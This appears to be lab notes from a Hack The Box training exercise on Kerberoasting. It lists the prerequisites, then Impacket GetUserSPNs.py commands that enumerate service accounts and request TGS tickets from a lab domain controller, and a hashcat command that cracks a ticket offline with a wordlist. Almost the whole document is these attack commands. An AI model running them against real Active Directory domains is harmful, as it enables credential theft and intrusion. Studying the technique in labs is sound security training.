#### Requirements
1. NTML Hash / PlainText password
2. Shell in the context of domain user account , or SYSTEM level access on a domain-joined host

#### Listing SPN Accounts with GetUserSPNs.py

```shell
Sauuron@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

#### Requesting all TGS Tickets

```shell
Sauuron@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

#### Requesting a Single TGS ticket

```shell
Sauuron@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```


#### Cracking the Ticket Offline with Hashcat

```shell
Sauuron@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```
